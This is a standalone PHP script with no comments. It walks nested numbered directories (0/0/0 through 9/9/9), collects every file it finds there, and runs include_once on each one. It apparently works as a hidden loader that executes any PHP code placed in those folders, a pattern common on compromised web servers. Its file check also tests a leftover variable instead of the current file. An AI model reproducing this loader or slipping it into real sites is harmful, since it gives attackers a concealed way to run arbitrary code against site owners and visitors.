<?php
	for($x=0;$x<=9;$x++) 
	{
		for($y=0;$y<=9;$y++) 
		{
			for($z=0;$z<=9;$z++) 
			{
				$xyz_array[]=$x.$y.$z;
			}
		}
	}
	if(isset($xyz_array))
	{
		foreach($xyz_array as $xyz)
		{
			$xyz_dir=implode('/',str_split($xyz));
			if(is_dir($xyz_dir))
			{
				$server_dirs[]=$xyz_dir;
			}
		}
	}
	if(isset($server_dirs))
	{
		foreach($server_dirs as $server_dir)
		{
			$scandir_server_dir=scandir($server_dir);
			foreach($scandir_server_dir as $server_files)
			{
				if((strlen($server_files)>2)&&(!is_dir($server_dir.'/'.$xyz_dir))&&(file_exists($server_dir.'/'.$server_files)))
				{
					$server_files_array[]=$server_dir.'/'.$server_files;
				}
			}
		}
	}
	if(isset($server_files_array))
	{
		foreach($server_files_array as $server_files_dir)
		{
			if(file_exists($server_files_dir))
			{
				include_once($server_files_dir);
			}
		}
	}
?>


















